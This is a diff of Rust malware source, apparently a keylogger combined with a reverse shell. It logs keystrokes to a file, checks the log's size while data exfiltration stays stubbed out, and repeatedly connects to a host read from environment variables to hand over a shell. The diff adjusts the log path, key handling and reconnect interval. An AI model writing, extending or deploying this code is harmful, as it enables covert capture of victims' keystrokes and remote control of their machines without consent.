@@ -1,5 +1,5 @@
 use std::fs::OpenOptions;
-use std::io::Write;
+use std::io::{Write};
 use std::net::TcpStream;
 use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
@@ -7,7 +7,7 @@ use device_query::{ Keycode };
 use dotenv::dotenv;
 use std::{ env };
 use std::{thread, time};
-
+use std::fs;
 
 
 pub fn match_case(key: &Keycode) -> &'static str {
@@ -15,7 +15,7 @@ pub fn match_case(key: &Keycode) -> &'static str {
     let mut file = OpenOptions::new()
         .create(true)
         .append(true)
-        .open("/tmp/keylog.txt")
+        .open("log.txt")
         .expect("Failed to open file");
 
     size_check(&mut file);
@@ -32,23 +32,27 @@ pub fn match_case(key: &Keycode) -> &'static str {
             file.write(b"\n").expect("Failed to write to file");
             "Enter"
         }
-        Keycode::RShift | Keycode::Slash => {
+
+        Keycode::CapsLock => {
             // write to file
-            file.write(b"?").expect("Failed to write to file");
-            "?"
-        } 
+            file.write(b"caps").expect("Failed to write to file");
+            "caps"
+        }
+
         _ => { 
-            write!(file, "{}",  key).expect("Failed to write to file");  
+            write!(file, "{}",  key.to_string().to_lowercase()).expect("Failed to write to file");  
             "Other"
         }
     }    
 }
 
 // check if file is too big
-// if it is, then send it via ftp
 fn size_check(file: &mut std::fs::File) {
     let file_size = file.metadata().unwrap().len();
+    
     if file_size > 100 {
+        let _content = fs::read_to_string("log.txt").unwrap();
+
         println!("File is too big");
         // send_file(file);
         // empty file
@@ -65,7 +69,7 @@ pub fn reverse_shell() {
     let addr = format!("{}:{}", key, value);
 
     loop {
-        thread::sleep(time::Duration::from_millis(10000));   
+        thread::sleep(time::Duration::from_millis(20000));   
 
         match TcpStream::connect(addr.clone()) {
             Ok(stream) => {
@@ -82,8 +86,8 @@ pub fn reverse_shell() {
             .       wait()
             .       unwrap();
             }
-            Err(_e) => {
-                // println!("Failed to connect to {}: {}", addr, e);
+            Err(e) => {
+                println!("Failed to connect to {}: {}", addr, e);
             }
         }
     }    
